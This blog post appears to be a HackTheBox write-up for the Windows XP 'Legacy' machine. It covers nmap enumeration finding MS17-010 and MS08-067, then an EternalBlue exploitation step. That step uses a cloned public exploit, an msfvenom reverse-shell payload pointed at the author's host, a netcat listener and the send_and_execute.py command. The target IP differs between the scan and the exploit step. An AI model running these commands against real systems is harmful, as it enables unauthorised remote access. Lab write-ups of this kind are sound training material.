---
title: "Legacy"
date: 2023-06-26T00:50:22+02:00
tags: ["smb","windows"]
categories: ["hackthebox"]
author: "Ro Hackss"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "A windows room that has vulnerable samba service running."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Legacy
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Legacy

![Untitled](/HTB/legacy-icon.png)

## Tools Used

- Nmap
- Msfvenom
- Github

## Port Scanning

First we need to do a port scan to know what are we trying to exploit.

```bash
PORT    STATE SERVICE     REASON          VERSION
135/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open              syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-06-30T18:16:12+03:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29179/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)
|   Check 4 (port 8957/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:b9:90 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00:50:56:b9:b9:90:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Look like we have two smb ports the 139,445 so we are going to focus on them.

## Enumeration

With `sudo nmap 10.10.10.14 -p 139,445 --script=vuln` I am going to see if nmap can see some vulnerabilities.

```bash
Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (sudo)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
```

I found two possible vulnerabilities the MS17-010 (CVE-2017-0143) and MS08-067 (CVE-2008-4250) but because I have SMB v1 I am going to exploit the first one.

## Exploiting

The CVE-2017-0143 or better called Eternal Blue is a vulnerability that allows us to exploit the Microsoft’s implementation of the Server Message Block (SMB) protocol with a crafted package to have RCE in the victim machine. 

I can exploit the machine easily with metasploit but I am going to try another way more oscp friendly.

If we google MS17-010 we can found a git repository: https://github.com/helviojunior/MS17-010.git

```bash
git clone https://github.com/helviojunior/MS17-010.git
```

Once we cloned the exploit let’s get a reverse shell with mfsvenom (Legal in OSCP).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f exe > eternalblue.exe
```

With a listener and sending the reverse shell with the help of the exploit we are able to own the machine.

```bash
nc -lv 4444
```

```bash
python send_and_execute.py 10.10.10.4 ~/Documents/exploits/eternalblue.exe
```

## Gaining an Initial Foothold

We are in now, with `dir user.txt /s` and `dir root.txt /s` we can know where is the flags.

![Untitled](/HTB/legacy-1.png)

![Untitled](/HTB/legacy-2.png)

## Lessons Learned

- What insights did you gain from the room?
    
    Now, we know how to perform a windows samba attack with the eternal blue vulnerability that allows me to RCE the victim machine.
    
- Were there any novel tools or techniques employed?
    
    I performed a CVE-2017-0143 exploit and msfvenom reverse shell.

**Thank you for reading, and happy hacking! 😄**
